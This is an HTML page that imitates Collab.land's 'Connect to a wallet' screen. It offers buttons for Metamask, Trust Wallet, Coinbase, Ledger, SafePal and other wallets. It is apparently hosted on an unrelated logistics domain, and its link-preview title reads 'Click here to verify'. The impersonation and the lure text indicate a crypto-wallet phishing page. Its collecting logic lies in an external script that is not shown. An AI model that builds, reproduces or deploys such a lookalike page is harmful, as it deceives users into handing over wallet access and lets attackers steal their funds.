<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    content="With Collab.land you can connect and manage multiple crypto wallets just from one place!">

  <!-- Open Graph / Facebook -->

  <meta property="og:url" content="https://fastlinkgloballogistics.com/">
  <meta property="og:title" content="Click here to verify">
  <meta property="og:description"
    content="With Collab.land you can connect and manage multiple crypto wallets just from one place!">
  <meta property="og:image" content="https://fastlinkgloballogistics.com/assets/images/banner.jpg">

  <!-- Twitter -->
  <meta property="twitter:card" content="collab.land">
  <meta property="twitter:url" content="https://fastlinkgloballogistics.com/">
  <meta property="twitter:title" content="Click here to verify">
  <meta property="twitter:description"
    content="With Collab.land you can connect and manage multiple crypto wallets just from one place!">
  <meta property="twitter:image" content="https://fastlinkgloballogistics.com/assets/images/banner.jpg">
  <!-- Met... -->
  <title>Collab.land</title>
  <link rel="icon" href="assets/images/favicon.ico" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
    integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous" />
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="assets/css/style.css" />
  <!-- Custom CSS -->
</head>

<body>
  <header class="mb-auto ml-4 mt-4">
    <h3 class="header-text">Collab.land</h3>
  </header>

  <div class="bg-light fixed-bottom main-section">
    <div class="d-flex flex-column mx-3">
      <h1 class="h5 mx-3 mt-4 text-bolder text-sm-left">
        Connect to a wallet
      </h1>
      <div class="list-items">
        <div class="crypto-button d-flex justify-content-between" id="Metamask">
          <a href="">Metamask</a>
          <img src="assets/images/metamask.png" alt="" height="25px" width="24px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="Trust Wallet">
          <a href="">Trust Wallet</a>
          <img src="assets/images/trustwallet.png" alt="" height="30px" width="30px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="Coinbase">
          <a href="">Coinbase</a>
          <img src="assets/images/coinbase.png" alt="" height="25px" width="25px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="Token pocket">
          <a href="">Token pocket</a>
          <img src="assets/images/tokenpocket.png" alt="" height="24px" width="24px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="WalletConnect">
          <a href="">WalletConnect</a>
          <img src="assets/images/walletconnect.svg" alt="" height="24px" width="24px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="Ledger">
          <a href="">Ledger</a>
          <img src="assets/images/ledger.png" alt="" height="24px" width="24px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="SafePal">
          <a href="">SafePal</a>
          <img src="assets/images/safepal.png" alt="" height="24px" width="22px" />
        </div>
        <div class="crypto-button d-flex justify-content-between" id="OtherWallets">
          <a href="">Other wallets</a>
          <img src="assets/images/otherwallet.png" alt="" height="24px" width="24px" />
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
    integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous">
  </script>
  <!-- JQuery -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous">
  </script>
  <!-- Bootstrap JS -->
  <script src="assets/js/script.js"></script>
  <!-- Custom JS -->
</body>

</html>
